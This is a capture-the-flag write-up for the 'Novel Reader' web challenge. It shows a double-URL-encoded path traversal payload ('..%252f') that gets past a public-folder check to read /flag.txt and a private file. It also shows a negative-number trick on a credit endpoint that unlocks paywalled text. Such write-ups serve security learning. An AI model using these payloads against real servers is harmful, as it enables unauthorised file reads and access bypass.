# Novel Reader

## Challenge Description

We have many fun novels for ya...

## Solution

### Recon

The challenge presented a basic site allowing users to read novels, introducing a "donate" mechanic that unlocked more words in a novel based on credits.


Diving into the source code, I identified several endpoints:

ENDPOINT | OVERVIEW
-------------------
api/stats | Outputs our credits and word count
api/charge | Deducts our credits to add words
api/read/<path:name> | Outputs a novel (limited to paid-for words)
api/list-public-novels | Lists all public novels
api/list-private-novels | Lists all private novels


We are not allowed to read not public novels, which is clear from read function:

```python
    if(not name.startswith('public/')):
        return {'success': False, 'msg': 'You can only read public novels!'}, 400
```

And also the challenge restricted access to private novels and limited the output to a specified number of "words_balance" (which is the number of words we "paid" for")

```python
buf = readFile(name).split(' ')
buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
```
The flags are hidden in a private novel /private/A-Secret-Tale.txt and in /flag.txt

### Step 1:

The if-statement in the read function hinted at a Local File Inclusion (LFI) vulnerability. 
The goal was to find a way to bypass this check. 
Simple attempts like
```
/api/read/public/../flag.txt
```

failed due to unpacking to
```
/api/read/flag.txt
```

And that can not pass the if-statement.

So, after some tinkering with encodings and what can decode the decoder `urllib.parse.unquote`, which is used in source, the one string, that worked, was `%252f` for a slash
```
GET /api/read/public/..%252f..%252f..%252fflag.txt 

{"msg":"MAPNA{uhhh-1-7h1nk-1-f0r607-70-ch3ck-cr3d17>0-4b331d4b}\n\n... Charge your account to unlock more of the novel!","success":true}
```

## Step 2

Attempting the same with A-Secret-Tale.txt revealed a limited output:
```json
{"msg":"Once.... Charge your account to unlock more of the novel!","success":true}
```

Even after purchasing all the words with the initial 100 tokens, the output remained restricted:
``json
{"msg":"Once a upon time there was a flag. The flag.... Charge your account to unlock more of the novel!","success":true}
```

So, we need to find another vulnerability, and read this file to the end.

So, after examining the line in code, which gives the output again:
```python
buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
```

I saw the basic python trick, where we can set our array indexes in negative, and that would mean "the last index n from the end".

So, something like `array[0:-1]` will actually read from first index to before last one. And guess what? There is no check for negative numbers in `api/charge` endpoint!

```python
nwords = request.args.get('nwords')
    if(nwords):
        nwords = int(nwords[:10])
        price = nwords * 10
        if(price <= session['credit']):
            session['credit'] -= price
            session['words_balance'] += nwords
```

So we can simply subtract our words_balance to -1, and after that we can read our flag

```
GET /api/read/public/..%252fprivate/A-Secret-Tale.txt

{"msg":"Once a upon time there was a flag. The flag was read like this: MAPNA{uhhh-y0u-607-m3-4641n-3f4b38571}.... Charge your account to unlock more of the novel!","success":true}
```


In conclusion, Novel Reader 1 and Novel Reader 2 challenges, while not overly difficult, required a deep understanding of Python backend and basic knowledge of LFI
